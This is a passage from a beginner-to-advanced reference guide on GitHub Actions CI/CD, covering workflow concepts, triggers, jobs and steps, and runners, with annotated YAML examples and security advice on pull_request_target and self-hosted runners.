# CI/CD with GitHub Actions — Beginner to Advanced — Complete Offline Reference

> **Who this is for:** Anyone going from "I have never written a workflow" to "I can design a secure, fast, production-grade CI/CD pipeline that lints, tests across a matrix, builds and pushes a Docker image to a registry, and deploys to a server or cloud with keyless OIDC auth" — entirely offline. Every concept is explained in **prose first** (what it is, *why* it exists, when and how to use it, the important keys/fields, best practices, and security notes), then demonstrated with heavily-commented, runnable YAML. Read top-to-bottom the first time; afterwards use the Table of Contents as a lookup. Sections are tagged **[B]** beginner, **[I]** intermediate, **[A]** advanced.
>
> **Version note:** This guide targets **GitHub Actions as of 2026**. The conventions and versions it uses throughout:
> - **Runner images:** `ubuntu-24.04` (and `ubuntu-latest` → 24.04), `windows-2022`/`windows-2025`, `macos-14`/`macos-15` (Apple Silicon). The classic `ubuntu-20.04` image is retired; `ubuntu-latest` now points at 24.04.
> - **Node 20+ action runtime:** the Actions runner executes JavaScript actions on **Node 20** (Node 16 was removed). Use actions that declare `using: node20`.
> - **First-party actions:** `actions/checkout@v4`, `actions/setup-node@v4`, `actions/setup-go@v5`, `actions/cache@v4`, and **`actions/upload-artifact@v4` / `actions/download-artifact@v4`** (v3 is **deprecated and shut down** — v4 is mandatory and is **not** wire-compatible with v3).
> - **OIDC** (OpenID Connect) for **keyless** cloud authentication is the modern standard — no long-lived cloud keys stored as secrets.
> - **`permissions:`** defaults to **read-only** `GITHUB_TOKEN` on many newer repos; always declare least privilege explicitly.
>
> Where behaviour is version-sensitive it is flagged with **⚡ Version note**. The author is on **Windows 11**, but workflows run on GitHub's Linux runners, so shell/path notes are called out where they matter. Always confirm exact inputs against an action's own `README`/`action.yml`.
>
> **Cross-references:** this guide assumes Git fundamentals (branches, tags, SHAs — see the **Git guide**), containers (the **Docker guide** for buildx, multi-stage, GHCR), and the app code being built/deployed (the **Node.js**, **Go/Gin**, **Next.js**, **NestJS**, and **PostgreSQL/Redis** guides). It deploys behind **Nginx** (see that guide).

---

## Table of Contents

1. [What CI/CD Is & What GitHub Actions Is](#1-what-cicd-is--what-github-actions-is) **[B]**
2. [Core Concepts & The Mental Model](#2-core-concepts--the-mental-model) **[B]**
3. [Triggers — The `on:` Key](#3-triggers--the-on-key) **[B/I]**
4. [Jobs & Steps](#4-jobs--steps) **[B/I]**
5. [Runners — Hosted vs Self-Hosted](#5-runners--hosted-vs-self-hosted) **[I]**
6. [Variables, Contexts & Expressions](#6-variables-contexts--expressions) **[I]**
7. [Jobs Orchestration — `needs`, Matrix, Conditionals](#7-jobs-orchestration--needs-matrix-conditionals) **[I/A]**
8. [Caching & Artifacts](#8-caching--artifacts) **[I]**
9. [Secrets & Security](#9-secrets--security) **[I/A]**
10. [Reusable & Composite Actions](#10-reusable--composite-actions) **[I/A]**
11. [Environments & Deployments](#11-environments--deployments) **[I/A]**
12. [Real Production Pipelines (Node & Go)](#12-real-production-pipelines-node--go) **[A]**
13. [Building & Publishing — Docker, npm, Go, Releases](#13-building--publishing--docker-npm-go-releases) **[A]**
14. [Deployment Strategies](#14-deployment-strategies) **[A]**
15. [Best Practices & Optimization](#15-best-practices--optimization) **[I/A]**
16. [Security Hardening (Consolidated)](#16-security-hardening-consolidated) **[A]**
17. [Gotchas & Syntax Reference](#17-gotchas--syntax-reference) **[I/A]**
18. [Study Path & Build-to-Learn Projects](#18-study-path--build-to-learn-projects)

---

## 1. What CI/CD Is & What GitHub Actions Is

### 1.1 The problem CI/CD solves **[B]**

Before continuous integration, teams worked in isolation for days or weeks, then merged everyone's work at the end — a painful event so dreaded it had a name: **"integration hell."** Conflicting changes piled up, nobody's tests had run together, and the build would break in subtle ways that were expensive to untangle. Separately, *deploying* the software meant a human SSHing into a server at midnight, copying files, running migrations by hand, and praying. Both processes were slow, manual, and error-prone — and the longer the gap between "code written" and "code verified/shipped," the more expensive each mistake became.

**CI/CD** is the automation that closes those gaps. The core idea is simple and powerful: **every change to the code triggers an automated pipeline** that builds it, tests it, and (optionally) ships it — every time, the same way, with no human stepping through manual checklists. Computers are tireless and consistent; humans are not. By making the machine do the repetitive verification and deployment work, you get fast feedback (you learn a change is broken in *minutes*, not days), reproducibility (the build runs identically every time), and confidence to ship often.

### 1.2 CI vs CD vs CD — three distinct ideas **[B]**

The acronym "CI/CD" actually bundles three related-but-distinct practices. Getting them straight is the foundation of everything else:

**Continuous Integration (CI)** — *integrate early and often, and verify automatically.* Developers merge their work into a shared mainline branch frequently (ideally many times a day), and **every** merge or pull request automatically triggers a build + the test suite. The *why*: small, frequent integrations surface conflicts and bugs while they're tiny and cheap to fix, instead of letting them accumulate. CI's deliverable is a **trustworthy answer to one question: "is the main branch in a working, tested state right now?"** A green CI run means the code compiles, the unit/integration tests pass, the linter is happy, and types check. CI says nothing about *shipping* — it's purely about verification.

**Continuous Delivery (CD)** — *keep the software always in a releasable state, ready to deploy at the push of a button.* On top of CI, Continuous Delivery automatically prepares a **deployable artifact** (a built binary, a Docker image, a bundled web app) for every change that passes CI, and runs it through further stages (staging deploys, smoke tests, integration tests against real dependencies). The crucial property: at any moment, the latest passing build *could* be released to production with a single, low-risk action. The actual push to production still requires a **human decision / manual approval** — but the *mechanics* are fully automated and rehearsed. The *why*: releasing becomes a business decision ("ship it now?"), not an engineering ordeal.

**Continuous Deployment (CD)** — *every change that passes the pipeline goes to production automatically, with no human gate.* This is Continuous Delivery taken one step further: there is **no manual approval** — if all the automated checks pass, the change is live in production within minutes. The *why*: maximum throughput and fastest feedback; you find out how a change behaves with real users almost immediately. The trade-off: it demands a *very* high-quality automated test suite, robust monitoring, feature flags, and easy rollbacks, because a bug sails straight to users. Many teams do Continuous Delivery (auto-deploy to staging, manual approve to prod) and reserve full Continuous Deployment for services where they trust their safety nets.

> **One-line summary:** **CI** = automatically *verify* every change. **Continuous Delivery** = always have a deployable artifact ready, deploy with a *manual* button. **Continuous Deployment** = deploy *automatically* with *no* button. The pipeline is the same machinery; the difference is *where (and whether) a human approval sits*.

```
   Code push ──► [ CI: build + lint + type + test ] ──► green?
                                                          │
                                            ┌─────────────┴──────────────┐
                                            ▼                            ▼
                            Continuous DELIVERY              Continuous DEPLOYMENT
                            build artifact → staging →       build artifact → staging →
                            ⏸ MANUAL APPROVAL → prod         (no gate) → AUTO prod
```

### 1.3 What GitHub Actions is **[B]**

**GitHub Actions** is GitHub's built-in CI/CD platform. It lets you define **automated workflows** — described in YAML files that live *inside your repository* — that run on GitHub's servers (or your own machines) in response to events: a push, a pull request, a schedule, a manual click, a release, and dozens more. Because it's part of GitHub itself, the code, the pipeline definition, the run logs, the secrets, the artifacts, the container registry (GHCR), and the deployment environments all live in one place, tightly integrated with pull requests and branch protection.

The defining feature — and the origin of the name — is **Actions**: reusable, shareable units of automation published to the **GitHub Marketplace**. Instead of scripting "check out the repo," "install Node," "set up Docker buildx," "log in to a registry" from scratch every time, you pull in a community or first-party *action* (e.g. `actions/checkout`, `docker/build-push-action`) with one line. This composability is what makes Actions fast to adopt: most of what you need already exists as an action; you glue them together.

### 1.4 GitHub Actions vs Jenkins vs GitLab CI vs CircleCI — trade-offs **[B/I]**

You should understand where Actions sits in the ecosystem so you can justify the choice:

| Tool | Hosting model | Config | Strengths | Weaknesses |
|---|---|---|---|---|
| **GitHub Actions** | SaaS (GitHub-hosted runners) + optional self-hosted | YAML in `.github/workflows/` | Zero infra to manage, deep GitHub/PR integration, huge Marketplace, generous free tier for public repos, OIDC, GHCR | Vendor lock-in to GitHub, YAML can get verbose, debugging is push-to-test, minutes cost money on private repos |
| **Jenkins** | **Self-hosted** (you run the server) | Groovy `Jenkinsfile` (or UI) | Infinitely flexible, massive plugin ecosystem, runs anywhere, no per-minute cost | *You* maintain/patch/scale the server and agents (real ops burden), security is your problem, older UX, plugin sprawl/conflicts |
| **GitLab CI/CD** | SaaS or self-hosted (GitLab) | `.gitlab-ci.yml` | Excellent if you're already on GitLab, built-in container registry, strong stages/DAG model, integrated DevOps suite | Tied to GitLab, smaller third-party marketplace than Actions |
| **CircleCI** | SaaS (+ self-hosted runners) | `.circleci/config.yml` | Fast, mature caching/parallelism, "orbs" (reusable config), good Docker support | Separate product from your VCS, pricing, less native PR integration than Actions |

The mental model: **Jenkins is "bring your own everything" (maximum control, maximum ops)**, while **Actions/GitLab CI/CircleCI are managed (less control, almost no ops)**. For projects *already hosted on GitHub*, Actions is the path of least resistance — the pipeline lives next to the code, secrets and environments are first-class, and you never patch a CI server. Choose Jenkins when you need extreme customization, must run on-prem behind a firewall, or already have a Jenkins investment. Choose GitLab CI when your code is on GitLab. Choose CircleCI for its caching/parallelism if you've outgrown a generic setup. This guide is about **GitHub Actions**.

> **Cross-reference:** Actions builds on **Git** concepts constantly — events fire on pushes to branches and tags, deployments are tied to commits/SHAs, and releases wrap Git tags. Keep the Git guide handy.

---

## 2. Core Concepts & The Mental Model

Internalize this hierarchy and 80% of Actions clicks into place. There are six nouns, and they nest:

```
   WORKFLOW                         (one .yml file in .github/workflows/)
   └── triggered by an EVENT        (push, pull_request, schedule, manual…)
       └── runs one or more JOBS    (run in parallel by default)
           └── each JOB runs on a RUNNER   (a fresh VM/container)
               └── and executes STEPS in order (sequential)
                   └── a step is either a `run:` (shell command)
                       or a `uses:` (a reusable ACTION)
```

Let's define each precisely, with the *why*.

### 2.1 Workflow **[B]**

A **workflow** is an automated process you define in a single **YAML file** placed in the special directory `.github/workflows/` at the root of your repository. The file name (e.g. `ci.yml`, `deploy.yml`) is arbitrary; what matters is the directory. A repository can hold **many** workflow files, each triggered by different events and doing different things (one for CI, one for deploying, one for nightly maintenance). GitHub discovers and runs them automatically — you don't "register" them anywhere. The *why* for putting them in the repo: the pipeline is **version-controlled alongside the code**, so it evolves with the project, is reviewable in pull requests, and is reproducible at any past commit.

### 2.2 Event / trigger **[B]**

An **event** (configured under the `on:` key) is *what causes a workflow to run*. The most common is a **push** to a branch or a **pull_request** being opened/updated, but there are dozens: a **schedule** (cron), a **manual** trigger (`workflow_dispatch`), a **release** being published, an **issue** being opened, another workflow calling this one (`workflow_call`), and an external API trigger (`repository_dispatch`). The event also carries a **payload** (which branch, which PR, who triggered it) that your workflow can read via the `github` context. Triggers are covered in depth in §3.

### 2.3 Job **[B]**

A **job** is a named set of steps that all run **on the same runner** (the same fresh machine), sharing its filesystem and environment. A workflow can have many jobs; **by default jobs run in parallel**, which is great for speed (lint, test, and build can all run at once). When jobs *must* run in order — e.g. "deploy only after tests pass" — you express that with the **`needs:`** key, which creates a dependency graph (a DAG, §7). Each job declares **`runs-on:`** to pick its runner. Crucially, **each job gets a brand-new, clean machine** — jobs do **not** share a filesystem with each other (you pass data between them via *artifacts* or *outputs*, §7–§8).

### 2.4 Step **[B]**

A **step** is a single task within a job, and steps run **sequentially, top to bottom**, on the job's runner. A step is one of two kinds:
- A **`run:` step** executes shell command(s) on the runner (e.g. `npm test`, `go build ./...`).
- A **`uses:` step** runs a reusable **action** (e.g. `uses: actions/checkout@v4`).

Steps in the same job *do* share the filesystem and can pass data via outputs and environment files (§6). If a step fails, the job stops by default (unless you mark the step `continue-on-error` or use an `if:` condition).

### 2.5 Runner **[B]**

A **runner** is the **machine that executes a job**. GitHub provides **GitHub-hosted runners** — fresh, ephemeral virtual machines (Ubuntu, Windows, or macOS) that GitHub spins up for each job, runs your steps on, then throws away. You can also register **self-hosted runners** — your own servers/VMs that you maintain (§5). The ephemerality of hosted runners is a feature: every job starts from a clean, known state, so there's no leftover cruft from previous runs (and no secrets left lying around). Runners come pre-loaded with common tooling (multiple language runtimes, Docker, build tools — §5.2).

### 2.6 Action **[B]**

An **action** is a **reusable, packaged unit of automation** that a `uses:` step pulls in. Actions are the building blocks of the ecosystem. They come in three flavours (§10): **JavaScript actions** (run on Node 20), **Docker container actions** (run a container), and **composite actions** (bundle several steps). Actions are referenced by `owner/repo@ref` — e.g. `actions/checkout@v4` — where the `@ref` pins a version (a tag, branch, or, for security, a full commit SHA — §9). The first-party `actions/*` set (checkout, setup-node, cache, upload-artifact) plus a handful of vendor actions (docker/*, aws-actions/*) cover the vast majority of needs.

### 2.7 The file structure — a minimal complete example **[B]**

Here is the smallest *complete, real* workflow, fully annotated. Drop it at `.github/workflows/ci.yml` and it runs on every push.

```yaml
# .github/workflows/ci.yml
# ── A workflow is one YAML file. Indentation is significant (use SPACES, never tabs). ──

name: CI                       # Human-friendly name shown in the GitHub "Actions" tab.
                               # Optional; if omitted, GitHub uses the file path.

on: [push]                     # THE EVENT: run this whole workflow on every `git push`
                               # to any branch. (`on:` has a richer object form — see §3.)

jobs:                          # A workflow contains one or more JOBS, keyed by an id.
  build:                       # ↑ "build" is the job id (your choice; used by `needs:`).
    runs-on: ubuntu-latest     # THE RUNNER: a fresh Ubuntu VM provided by GitHub.

    steps:                     # STEPS run in order, top to bottom, on that one runner.
      - name: Check out code   # `name:` is the label shown in the UI (optional but nice).
        uses: actions/checkout@v4   # A `uses:` step = run an ACTION. This one clones your
                                    # repo onto the runner. Almost every workflow starts here,
                                    # because the runner is empty until you check the code out.

      - name: Set up Node.js
        uses: actions/setup-node@v4 # Installs a specific Node version + wires up its cache.
        with:                       # `with:` passes INPUTS to the action.
          node-version: '20'

      - name: Install dependencies
        run: npm ci                 # A `run:` step = shell command(s) on the runner.
                                    # `npm ci` does a clean, lockfile-exact install (CI-friendly).

      - name: Run tests
        run: npm test               # If this exits non-zero, the step FAILS, the job FAILS,
                                    # and the commit is marked with a red ✗ on GitHub.
```

That's the whole mental model in 25 lines: **a workflow, triggered by an event, with a job, on a runner, executing steps that are either `run:` commands or `uses:` actions.** Everything else in this guide elaborates on those six nouns.

> **⚡ Version note:** Always pin `actions/checkout` and friends to a major version (`@v4`). v3 of checkout runs on the removed Node 16 runtime and will eventually break; for third-party actions, prefer pinning to a **full SHA** (§9.6) for supply-chain safety.

### 2.8 What actually happens when a run starts **[B/I]**

Tracing the lifecycle once demystifies everything. When an event fires (say, you `git push`):

1. **Event received.** GitHub receives the push and looks at every workflow file in `.github/workflows/` whose `on:` matches the event *and* passes its branch/path/tag filters.
2. **Run created.** For each matching workflow, GitHub creates a **workflow run** — a record you see in the Actions tab — and evaluates which **jobs** to schedule (resolving the `needs` DAG, expanding any `matrix` into concrete jobs).
3. **Runner assigned.** For each job with no unmet `needs`, GitHub finds an available runner matching `runs-on` and **provisions a fresh VM** (hosted) or hands the job to your machine (self-hosted).
4. **Job setup.** The runner sets up the workspace, starts any `services:` containers (and waits on their healthchecks), and injects secrets/env/contexts.
5. **Steps execute.** Steps run top-to-bottom. Each `uses:` step is downloaded (the action's code) and run; each `run:` step is executed in the chosen shell. A non-zero exit (or a thrown action error) **fails the step**, which by default fails the job and skips remaining steps (except `always()`/`failure()` ones).
6. **Job teardown.** Post-steps run (e.g. caches save, services stop). The job reports **success/failure/cancelled**, which unblocks (or skips) any jobs that `needs` it.
7. **Run completes.** When all jobs finish, the run's overall conclusion is posted back to the commit/PR as a **status check** (the green ✓ / red ✗), and artifacts/logs are retained per their retention settings.

The two facts to burn in: **every job is a clean, isolated machine** (no shared disk between jobs — artifacts/outputs bridge them), and **a failed step fails the job** unless you explicitly say otherwise.

---

## 3. Triggers — The `on:` Key

The **`on:`** key declares **which events start the workflow**. It's the single most important key for controlling *when* your automation runs, and getting it wrong is a top cause of "my workflow didn't run" (or "it ran way too often"). `on:` can be a string, a list, or — most usefully — an object that filters by branch, path, tag, or activity type.

### 3.1 `push` and `pull_request` — the bread and butter **[B]**

These two cover the vast majority of CI. **`push`** fires when commits are pushed to the repository — to a branch *or* a tag. **`pull_request`** fires when a PR is opened, updated (new commits pushed to it), reopened, etc. The *why for distinguishing them*: you often want CI to run on every push to a feature branch *and* on the PR that merges it, and to run deploys only on pushes to `main` or to a version tag.

```yaml
on:
  push:
    branches:                    # Only pushes to these branches trigger the workflow.
      - main                     # exact branch name…
      - 'release/**'             # …or a glob: any branch under release/
    branches-ignore: []          # (mutually exclusive with `branches:` — use one)
    tags:
      - 'v*.*.*'                 # Also fire on version tags like v1.2.3 (great for releases).
    paths:                       # PATH FILTER: only run if files matching these changed.
      - 'src/**'                 # e.g. don't run the heavy test suite for a README typo.
      - 'package.json'
    paths-ignore:                # (the inverse — skip if ONLY these changed)
      - '**.md'
      - 'docs/**'

  pull_request:
    branches: [ main ]           # Run on PRs that TARGET main (i.e. want to merge INTO main).
    types:                       # Which PR activities trigger it (defaults shown):
      - opened
      - synchronize              # ← "new commits pushed to the PR" (the common one)
      - reopened
```

**Branch and path filters** are the key levers:
- **`branches:`** restricts *which branch* a push must target. For `pull_request`, `branches:` filters by the **base** (target) branch — the branch you're merging *into*.
- **`paths:` / `paths-ignore:`** restrict by *which files changed*, so you don't burn minutes (and money) running the full suite on a docs-only change. **Gotcha:** if a workflow is a *required status check* (branch protection), `paths-ignore` skipping it can *block* merges, because the required check never reports — use `paths` carefully on required workflows, or use a "no-op" companion job. (Covered in §15.)
- Glob syntax: `*` matches within a path segment, `**` matches across segments, `?` one char. `'release/**'` matches `release/1.0`, `release/hotfix/x`, etc.

> **⚡ Version note:** A *single* workflow run is filtered by **either** `branches` **or** `branches-ignore` (not both), and likewise `paths`/`paths-ignore`. Mixing the positive and negative forms of the same filter is invalid.

### 3.2 `schedule` — cron triggers **[I]**

**`schedule`** runs a workflow on a **cron timetable**, independent of any code change. Use it for nightly builds, periodic dependency audits, scheduled data syncs, cleanup jobs, or hitting an endpoint on an interval. The *why*: some work is time-driven, not event-driven.

```yaml
on:
  schedule:
    # POSIX cron: ┌ minute (0-59)
    #             │ ┌ hour (0-23, UTC!)
    #             │ │ ┌ day-of-month (1-31)
    #             │ │ │ ┌ month (1-12)
    #             │ │ │ │ ┌ day-of-week (0-6, Sun=0)
    #             │ │ │ │ │
    - cron: '0 3 * * *'        # Every day at 03:00 UTC (a nightly build).
    - cron: '*/15 * * * *'     # Every 15 minutes (the shortest practical interval).
    - cron: '0 9 * * 1'        # 09:00 UTC every Monday (weekly report).
```

**Key facts and gotchas:**
- Cron times are **always UTC** — there is no timezone setting. Convert your local time to UTC yourself.
- Scheduled runs only execute on the workflow file present in the **default branch**.
- GitHub does **not guarantee exact timing** — under load, scheduled runs can be delayed by several minutes (don't rely on `schedule` for second-precision tasks).
- Scheduled workflows on a repo with **no activity for 60 days are automatically disabled** (and you get an email). Push something or re-enable to resume.
- The shortest interval GitHub honours reliably is about **5 minutes**.

### 3.3 `workflow_dispatch` — manual trigger with inputs **[I]**

**`workflow_dispatch`** adds a **"Run workflow" button** in the Actions UI (and a `gh workflow run` CLI command / API call), letting a human start the workflow on demand — optionally collecting **typed inputs**. This is the standard way to build **manual deploy buttons**, "promote to production" actions, or parameterized maintenance tasks. The *why*: not everything should be automatic; sometimes you want a human to choose *when* and *with what parameters*.

```yaml
on:
  workflow_dispatch:
    inputs:
      environment:
        description: 'Target environment to deploy to'
        required: true
        type: choice            # Renders a dropdown in the UI. Types: string|choice|boolean|environment|number
        options:
          - staging
          - production
        default: staging
      version:
        description: 'Git tag or SHA to deploy'
        required: true
        type: string
      dry_run:
        description: 'Plan only, do not apply'
        required: false
        type: boolean
        default: true

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Show chosen inputs
        run: |
          echo "Env:     ${{ inputs.environment }}"   # Read inputs via the `inputs` context.
          echo "Version: ${{ inputs.version }}"
          echo "DryRun:  ${{ inputs.dry_run }}"
```

> Read dispatch inputs via the **`inputs`** context (`${{ inputs.environment }}`), or the legacy `${{ github.event.inputs.* }}` (always a string). The `inputs` context respects the declared `type:` (a `boolean` is a real boolean).

### 3.4 `workflow_call` — reusable workflows **[A]**

**`workflow_call`** marks a workflow as **callable by other workflows**, turning it into a reusable building block (§10.4). The caller passes `inputs` and `secrets`; the callee can return `outputs`. The *why*: DRY — define your "test" or "build-and-push" pipeline once and call it from many repos/workflows instead of copy-pasting YAML.

```yaml
# .github/workflows/reusable-test.yml  (the CALLEE)
on:
  workflow_call:
    inputs:
      node-version:
        type: string
        default: '20'
    secrets:
      NPM_TOKEN:
        required: false
    outputs:
      coverage:
        description: 'Coverage percentage'
        value: ${{ jobs.test.outputs.cov }}
```

Full caller/callee example in §10.4.

### 3.5 `repository_dispatch` — external triggers **[A]**

**`repository_dispatch`** lets an **external system** start a workflow via the GitHub REST API (`POST /repos/{owner}/{repo}/dispatches`) with a custom `event_type` and JSON payload. Use it to kick off a deploy from another service, a chatops bot, or a cross-repo workflow.

```yaml
on:
  repository_dispatch:
    types: [deploy-request]      # Match the "event_type" sent in the API call.

jobs:
  handle:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Payload: ${{ toJSON(github.event.client_payload) }}"
        # The POSTed JSON arrives in github.event.client_payload.
```

Trigger it with: `curl -X POST -H "Authorization: Bearer $TOKEN" -H "Accept: application/vnd.github+json" https://api.github.com/repos/OWNER/REPO/dispatches -d '{"event_type":"deploy-request","client_payload":{"env":"prod"}}'`.

### 3.6 `pull_request` vs `pull_request_target` — a SECURITY landmine **[A]**

This is the single most important security distinction in GitHub Actions, and misunderstanding it has leaked countless secrets. Read this twice.

**`pull_request`** runs the workflow **from the PR's *merge ref* — i.e. the contributor's code** — and, critically, when the PR comes **from a fork**, the run gets a **read-only `GITHUB_TOKEN` and NO access to repository secrets**. This is a deliberate safety measure: an outside contributor's PR code is *untrusted*, so GitHub refuses to hand it your secrets or write permissions. The downside: workflows that legitimately need secrets (e.g. to comment on the PR or upload coverage) won't have them on fork PRs.

**`pull_request_target`** runs the workflow **in the context of the *base* repository (your `main`), with FULL read/write `GITHUB_TOKEN` and access to secrets** — but the *triggering PR* may still be from an untrusted fork. This exists so trusted automation (labeling, welcome comments) can run on fork PRs with credentials. **The landmine:** if a `pull_request_target` workflow **checks out and executes the PR's code** (e.g. `actions/checkout` with the PR head, then `npm install` runs a malicious post-install script, or runs the PR's build), that **untrusted code now runs with your secrets and a write token** — a complete repository compromise. This is a real, repeatedly-exploited class of vulnerability.

**The rules to never break:**
- ✅ Use **`pull_request`** for normal CI (build/test). Accept that fork PRs lack secrets; design around it.
- ✅ Use **`pull_request_target`** *only* for tasks that **do NOT check out or execute the PR's code** — labeling, commenting, triage.
- ❌ **NEVER** check out the PR head (`ref: ${{ github.event.pull_request.head.sha }}`) and then run/build/install it inside a `pull_request_target` job. If you must build untrusted code, do it under `pull_request` (no secrets) — or use a two-workflow pattern (`pull_request` builds with no secrets and uploads an artifact; a separate `workflow_run`-triggered trusted workflow processes it).

```yaml
# SAFE use of pull_request_target: label PRs from forks, never run their code.
on:
  pull_request_target:
    types: [opened]
permissions:
  pull-requests: write           # Least privilege: only what labeling needs.
jobs:
  label:
    runs-on: ubuntu-latest
    steps:
      # NOTE: NO `actions/checkout` of the PR head, and NO build/install of PR code.
      - uses: actions/labeler@v5   # Pinned action that only reads file paths + adds labels.
```

> **Gotcha:** Even a seemingly innocent `actions/checkout` in a `pull_request_target` job that *then* runs a step over the checked-out files is dangerous, because the checked-out files are attacker-controlled. The safe default is: **`pull_request_target` + secrets + checking out untrusted code = forbidden.**

### 3.7 Other useful events & the `types` filter **[I]**

Many events accept a **`types:`** filter to narrow *which activity* triggers them: `release` (`types: [published]`), `issues` (`[opened, labeled]`), `workflow_run` (run after *another* workflow finishes), `push`/`pull_request` (shown above). Example for releases:

```yaml
on:
  release:
    types: [published]           # Fire when you publish a GitHub Release (great for deploy/publish).
```

---

## 4. Jobs & Steps

### 4.1 `runs-on` — picking the runner **[B]**

Every job must declare **`runs-on:`**, naming the runner image (or self-hosted labels). This is where you choose the OS and (optionally) the size of the machine.

```yaml
jobs:
  build:
    runs-on: ubuntu-latest       # The most common, fastest, cheapest choice → currently ubuntu-24.04.
    # runs-on: ubuntu-24.04      # Pin to a specific image for reproducibility.
    # runs-on: windows-latest    # → windows-2022/2025 (needed for .NET/Windows-specific builds).
    # runs-on: macos-latest      # → macos-14/15 Apple Silicon (needed for iOS/macOS builds — pricey).
    # runs-on: [self-hosted, linux, x64, gpu]   # Match by LABELS on your own runners (§5.3).
```

> **⚡ Version note / cost:** `ubuntu-*` runners are the cheapest minute-multiplier (1×). **Windows is ~2× and macOS ~10×** the per-minute cost on private repos — only reach for them when you genuinely need that OS. Public repos get generous free minutes; private repos consume your plan's minute budget (§15.7).

### 4.2 `run` vs `uses` — the two kinds of step **[B]**

We met these in §2.4; here's the detail.

- **`run:`** executes shell commands on the runner. Multi-line is supported with YAML's `|` block scalar. Default shell is **`bash`** on Linux/macOS and **`pwsh` (PowerShell Core)** on Windows.
- **`uses:`** runs a packaged action by reference, configured with `with:` inputs.

```yaml
steps:
  # ── A `run:` step — shell commands ──
  - name: Build
    run: |                       # `|` = a multi-line block; each line runs in the SAME shell.
      echo "Building…"
      npm run build
      ls -la dist/
    working-directory: ./frontend   # Run this step's commands in a SUBDIRECTORY (not repo root).
    shell: bash                     # Override the default shell (bash|pwsh|python|sh|cmd|powershell).
    env:                            # Step-level env vars (visible only to this step).
      NODE_ENV: production

  # ── A `uses:` step — an action ──
  - name: Set up Go
    uses: actions/setup-go@v5    # `owner/repo@ref`. Pin the ref (here a major tag; SHA is safer — §9.6).
    with:                        # Inputs the action documents in its action.yml.
      go-version: '1.23'
      cache: true
```

**Key per-step keys:**
- **`name:`** — the label in the UI (optional; defaults to the command/action).
- **`id:`** — an identifier so other steps can reference this step's **outputs** (`steps.<id>.outputs.<name>`, §6.5).
- **`if:`** — a conditional; the step runs only if it evaluates truthy (§6.7).
- **`continue-on-error:`** — if `true`, a failure here does *not* fail the job.
- **`timeout-minutes:`** — kill the step after N minutes (defaults to the job timeout).
- **`working-directory:`** — the cwd for `run:` steps.
- **`env:`** — environment variables scoped to this step.

### 4.3 Job-level keys you'll use constantly **[B/I]**

```yaml
jobs:
  test:
    name: Unit Tests (${{ matrix.node }})   # Dynamic job name; great with matrices.
    runs-on: ubuntu-latest
    timeout-minutes: 15          # Fail the job if it runs longer than 15 min (avoid stuck jobs eating minutes).
    needs: [lint]                # This job waits for `lint` to succeed first (§7).
    if: github.ref == 'refs/heads/main'   # Job-level condition (skip on non-main).
    permissions:                 # GITHUB_TOKEN scopes for THIS job (least privilege — §9.3).
      contents: read
    env:                         # Job-level env (visible to all steps in this job).
      CI: true
    defaults:
      run:
        shell: bash              # Default shell for all `run:` steps in this job.
        working-directory: ./api # Default cwd for all `run:` steps in this job.
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm test
```

### 4.4 Shells & cross-platform notes **[I]**

The same workflow can run on Linux, Windows, and macOS via a matrix (§7.2), but shell syntax differs. **Bash** (Linux/macOS default) and **PowerShell** (`pwsh`, Windows default) are not interchangeable. To write one script that works everywhere, either pick `shell: bash` explicitly (it's available on the Windows runners too) or branch on the OS. Note that **`run:` steps exit non-zero on the first failing command** only if the shell is configured for it — bash steps run with `set -eo pipefail` by default, so any failing command fails the step.

```yaml
steps:
  - name: Cross-platform script (force bash everywhere)
    shell: bash
    run: |
      echo "Runner OS is: $RUNNER_OS"   # Linux | Windows | macOS — a default env var.
      if [ "$RUNNER_OS" == "Windows" ]; then echo "on win"; fi
```

---

## 5. Runners — Hosted vs Self-Hosted

A **runner** is the machine that executes your jobs. Choosing between GitHub-hosted and self-hosted runners — and securing self-hosted ones — is a real engineering decision with cost and security consequences.

### 5.1 GitHub-hosted runners **[I]**

**GitHub-hosted runners** are **ephemeral virtual machines** that GitHub provisions fresh for each job and destroys afterwards. This ephemerality is their best property: **every job starts from a clean, known image**, so there's no state leakage between runs and nothing for an attacker to persist. They come in Ubuntu, Windows, and macOS flavours, are fully managed (GitHub patches/updates them), and need zero infrastructure on your side. For ~95% of projects, hosted runners are the right answer.

The default specs (standard hosted runners, 2026): roughly **4 vCPU / 16 GB RAM / 14 GB SSD** on Linux and Windows; macOS runners are larger (Apple Silicon, more RAM). You don't manage these — GitHub does.

### 5.2 What's preinstalled **[I]**

Hosted runner images come **loaded with common tooling** so you rarely install from scratch: multiple versions of Node, Python, Go, Java, Ruby, .NET; Docker + Buildx + Compose; Git, `gh` CLI, `jq`, `curl`, `wget`, `make`, `zip`; cloud CLIs (aws, az, gcloud); browsers for E2E tests; and the `actions/setup-*` actions can switch to *exact* versions quickly because images are pre-seeded. The *why*: faster jobs — you `setup-node@v4` to pick Node 20 and it's near-instant because the toolcache already has it. (GitHub publishes the full manifest of each image's contents in the `actions/runner-images` repo.)

> **Gotcha:** Don't assume a tool's *exact* version — `ubuntu-latest` rolls forward (it moved from 22.04 → 24.04), which can change default versions of things like Postgres clients or Python. **Pin** `runs-on: ubuntu-24.04` and use `setup-*` actions to pin language versions when reproducibility matters.

### 5.3 Self-hosted runners — when & why **[I/A]**

A **self-hosted runner** is a machine **you** own (a VM, a bare-metal box, a container) on which you install GitHub's runner agent; it then polls GitHub for jobs labeled to match it. You reach for self-hosted runners when you need: **special hardware** (GPUs, lots of RAM/CPU beyond hosted specs), **access to a private network** (an internal DB, an on-prem service behind a firewall), **custom/heavy preinstalled software** you don't want to install every run, **higher concurrency than your hosted minutes allow**, or **cost control** at very high volume. You select them with labels:

```yaml
jobs:
  build:
    runs-on: [self-hosted, linux, x64, gpu]   # ALL labels must match a registered runner.
```

**The trade-off:** *you* now own the machine — patching the OS, the runner agent, the toolchain; scaling it; and (critically) **securing it**. Self-hosted runners are **not ephemeral by default** — state persists between jobs unless you rebuild the machine, which is both a convenience and a hazard.

### 5.4 Self-hosted runner SECURITY — especially on public repos **[A]**

This is the most dangerous corner of self-hosted runners, and the rule is blunt:

> **NEVER use a self-hosted runner with a PUBLIC repository.**

